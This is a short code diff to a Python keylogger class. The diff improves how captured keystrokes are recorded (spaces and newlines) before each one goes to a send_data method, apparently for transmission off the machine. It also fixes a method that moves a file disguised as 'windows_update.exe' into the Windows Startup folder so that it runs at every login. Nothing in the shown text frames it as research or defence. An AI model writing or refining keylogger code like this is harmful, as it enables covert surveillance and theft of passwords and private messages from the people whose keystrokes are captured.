@@ -24,16 +24,17 @@ class Keylogger:
         except AttributeError:
             
             if key == key.space:
-                hit_key = ""
-
+                hit_key = " "
+            elif key == key.enter:
+                hit_key = "\n"
             else:
                 hit_key = "" + str(key) + ""
 
         self.send_data(hit_key)
 
-    def change_dir(self, username):
+    def change_dir(self):
         username = getpass.getuser()
-        path = fr'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        path = f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
         shutil.move("windows_update.exe", path)
 
 
